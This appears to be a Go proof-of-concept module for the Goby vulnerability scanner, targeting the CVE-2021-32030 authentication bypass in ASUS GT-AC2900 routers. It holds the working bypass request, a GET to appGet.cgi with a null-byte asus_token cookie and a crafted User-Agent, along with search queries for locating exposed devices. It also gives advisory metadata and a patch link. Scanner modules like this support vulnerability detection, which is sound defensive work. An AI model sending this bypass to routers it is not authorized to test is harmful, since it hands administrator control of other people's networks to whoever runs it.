package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
)

func init() {
	expJson := `{
    "Name": "ASUS GT-AC2900 Authentication Bypass (CVE-2021-32030)",
    "Description": "The administrator application on ASUS GT-AC2900 devices before 3.0.0.4.386.42643 allows authentication bypass when processing remote input from an unauthenticated user, leading to unauthorized access to the administrator interface. This relates to handle_request in router/httpd/httpd.c and auth_check in web_hook.o. An attacker-supplied value of \\0 matches the device's default value of \\0 in some situations.",
    "Impact": "ASUS GT-AC2900 Authentication Bypass (CVE-2021-32030)",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability, the patch access link:</p><p> https: //www.asus.com/Networking-IoT-Servers/WiFi-Routers/ASUS-Gaming-Routers/RT-AC2900/HelpDesk_BIOS/</p>",
    "Product": "ASUS GT-AC2900",
    "VulType": [
        "Permission Bypass"
    ],
    "Tags": [
        "Permission Bypass"
    ],
    "Translation": {
        "CN": {
            "Name": "华硕 GT-AC2900 权限绕过漏洞（CVE-2021-32030）",
            "Description": "ASUS GT-AC2900 是中国华硕（ASUS）公司的一个路由器。ASUS GT-AC2900 devices 3.0.0.4.386.42643 之前版本存在安全漏洞，该漏洞允许管理员应用程序在处理未经认证用户的远程输入时，允许绕过认证，导致未经认证的用户访问管理员界面。",
            "Impact": "<p>攻击者可通过构造特殊的cookie绕过权限检查，进入访问管理员界面，控制整个设备。<br></p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，补丁获取链接：</p><p><span style=\"color: rgb(51, 51, 51); font-size: 16px;\"><a href=\"https://www.asus.com/Networking-IoT-Servers/WiFi-Routers/ASUS-Gaming-Routers/RT-AC2900/HelpDesk_BIOS/\" rel=\"nofollow\">https://www.asus.com/Networking-IoT-Servers/WiFi-Routers/ASUS-Gaming-Routers/RT-AC2900/HelpDesk_BIOS/</a></span></p>",
            "Product": "华硕 GT-AC2900",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "ASUS GT-AC2900 Authentication Bypass (CVE-2021-32030)",
            "Description": "The administrator application on ASUS GT-AC2900 devices before 3.0.0.4.386.42643 allows authentication bypass when processing remote input from an unauthenticated user, leading to unauthorized access to the administrator interface. This relates to handle_request in router/httpd/httpd.c and auth_check in web_hook.o. An attacker-supplied value of \\0 matches the device's default value of \\0 in some situations.",
            "Impact": "ASUS GT-AC2900 Authentication Bypass (CVE-2021-32030)",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability, the patch access link:</p><p><span style=\"color: rgb(51, 51, 51); font-size: 16px;\"> <a href=\"https://www.asus.com/Networking-IoT-Servers/WiFi-Routers/ASUS-Gaming-Routers/RT-AC2900/HelpDesk_BIOS/\" rel=\"nofollow\">https: //www.asus.com/Networking-IoT-Servers/WiFi-Routers/ASUS-Gaming-Routers/RT-AC2900/HelpDesk_BIOS/</a></span></p>",
            "Product": "ASUS GT-AC2900",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass"
            ]
        }
    },
    "FofaQuery": "(body=\"document.getElementsByClassName(\\\"model-name\\\")[0].innerhtml = \\\"GT-AC2900_SH\\\"\") || (title=\"ASUS Wireless Router GT-AC2900\" || body=\"document.getElementsByClassName(\\\"model-name\\\")[0].innerhtml = \\\"GT-AC2900\\\"\") || (title=\"ASUS Wireless Router GT-AC2900\") || (title=\"ASUS Wireless Router GT-AC2900 SH\")",
    "GobyQuery": "(body=\"document.getElementsByClassName(\\\"model-name\\\")[0].innerhtml = \\\"GT-AC2900_SH\\\"\") || (title=\"ASUS Wireless Router GT-AC2900\" || body=\"document.getElementsByClassName(\\\"model-name\\\")[0].innerhtml = \\\"GT-AC2900\\\"\") || (title=\"ASUS Wireless Router GT-AC2900\") || (title=\"ASUS Wireless Router GT-AC2900 SH\")",
    "Author": "gaopeng2@baimaohui.net",
    "Homepage": "https://www.asus.com.cn/",
    "DisclosureDate": "2021-05-06",
    "References": [
        "https://github.com/atredispartners/advisories/blob/master/ATREDIS-2020-0010.md",
        "https://nvd.nist.gov/vuln/detail/CVE-2021-32030"
    ],
    "HasExp": false,
    "Is0day": false,
    "Level": "1",
    "CVSS": "9.8",
    "CVEIDs": [
        "CVE-2021-32030"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-202105-277"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "data": "",
                "data_type": "text",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "asusrouter--",
                    "Referer": "{{{scheme}}}://{{{hostinfo}}}",
                    "Cookie": "asus_token={{{NULL_BYTE}}}Invalid; clickedItem_tab=0"
                },
                "method": "GET",
                "uri": "/appGet.cgi?hook=get_cfg_clientlist()"
            },
            "ResponseTest": {
                "checks": [
                    {
                        "bz": "",
                        "operation": "==",
                        "type": "item",
                        "value": "200",
                        "variable": "$code"
                    },
                    {
                        "bz": "",
                        "operation": "==",
                        "type": "item",
                        "value": "get_cfg_clientlist",
                        "variable": "$body"
                    }
                ],
                "operation": "AND",
                "type": "group"
            }
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "data": "",
                "data_type": "text",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "asusrouter--",
                    "Referer": "{{{scheme}}}://{{{hostinfo}}}",
                    "Cookie": "asus_token={{{NULL_BYTE}}}Invalid; clickedItem_tab=0"
                },
                "method": "GET",
                "uri": "/appGet.cgi?hook=get_cfg_clientlist()"
            },
            "ResponseTest": {
                "checks": [
                    {
                        "bz": "",
                        "operation": "==",
                        "type": "item",
                        "value": "200",
                        "variable": "$code"
                    },
                    {
                        "bz": "",
                        "operation": "==",
                        "type": "item",
                        "value": "get_cfg_clientlist",
                        "variable": "$body"
                    }
                ],
                "operation": "AND",
                "type": "group"
            }
        }
    ],
    "ExpParams": [],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "9687"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			cfg := httpclient.NewGetRequestConfig("/appGet.cgi?hook=get_cfg_clientlist()")
			variable, _ := url.QueryUnescape("%00")
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("User-Agent", "asusrouter--")
			cfg.Header.Store("Cookie", fmt.Sprintf("asus_token=%sInvalid; clickedItem_tab=0", variable))
			if resp, err := httpclient.DoHttpRequest(hostinfo, cfg); err == nil {
				if strings.Contains(resp.RawBody, "get_cfg_clientlist") {
					return true
				}
			}
			return false
		},
		nil,
	))
}
